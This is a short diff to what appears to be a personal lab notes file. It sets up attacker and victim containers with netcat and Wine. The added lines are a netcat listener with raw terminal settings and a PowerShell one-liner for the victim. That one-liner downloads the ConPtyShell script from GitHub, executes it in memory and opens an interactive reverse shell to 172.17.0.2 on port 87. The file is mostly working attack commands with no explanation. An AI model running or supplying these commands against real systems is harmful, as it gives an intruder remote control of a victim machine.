@@ -9,3 +9,18 @@ A/V apt install netcat-traditional
 
  V  apt install wine
  V  wine test.exe
+
+Windows
+
+ A stty raw -echo; (stty size; cat) | nc -lvnp 4444
+ A stty raw -echo; (stty size; cat) | nc -lvnp 87 -s 172.17.0.2
+
+ V IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 172.17.0.2 87
+
+Ip Ubuntu:
+
+ docker inspect Attacker
+
+
+
+apt install -y netcat-traditional wget wine
